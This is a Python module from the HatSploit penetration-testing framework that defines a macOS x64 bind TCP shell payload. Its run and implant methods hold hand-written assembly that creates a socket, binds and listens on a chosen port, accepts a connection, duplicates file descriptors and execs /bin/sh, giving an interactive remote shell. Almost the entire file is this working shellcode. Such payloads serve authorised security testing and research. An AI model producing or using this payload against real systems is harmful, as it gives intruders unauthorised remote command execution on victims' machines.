"""
This payload requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

from hatsploit.lib.core.payload.basic import *
from hatsploit.lib.core.payload.macos import MacOS


class HatSploitPayload(Payload, Handler, MacOS):
    def __init__(self):
        super().__init__({
            'Name': "macOS x64 Shell Bind TCP",
            'Payload': "macos/x64/shell_bind_tcp",
            'Authors': [
                "Ivan Nikolskiy (enty8080) - payload developer",
            ],
            'Description': """
                This payload creates an interactive bind TCP shell for macOS
                with x64 architecture.
            """,
            'Arch': ARCH_X64,
            'Platform': OS_MACOS,
            'Type': BIND_TCP,
        })

    def implant(self):
        return self.__asm__(
            """
            start:
                xor rsi, rsi
                mov sil, 0x3

            dup:
                mov rax, r8
                mov al, 0x5a
                sub sil, 1
                syscall

                test rsi, rsi
                jne dup

                push rsi
                mov rdi, 0x68732f6e69622f2f
                push rdi
                push rsp
                pop rdi
                xor rdx, rdx
                mov rax, r8
                mov al, 0x3b
                syscall
            """
        )

    def run(self):
        return self.__asm__(
            f"""
            start:
                xor rdi, rdi
                mul rdi
                mov dil, 0x2
                xor rsi, rsi
                mov sil, 0x1
                mov al, 0x2
                ror rax, 0x28
                mov r8, rax
                mov al, 0x61
                syscall

                mov rsi, 0x00000000{self.rport.little.hex()}020f
                push rsi
                push rsp
                pop rsi
                mov rdi, rax
                xor dl, 0x10
                mov rax, r8
                mov al, 0x68
                syscall

                xor rsi, rsi
                mov sil, 0x2
                mov rax, r8
                mov al, 0x6a
                syscall

                xor rsi, rsi
                xor rdx, rdx
                mov rax, r8
                mov al, 0x1e
                syscall
            """
        ) + self.implant()
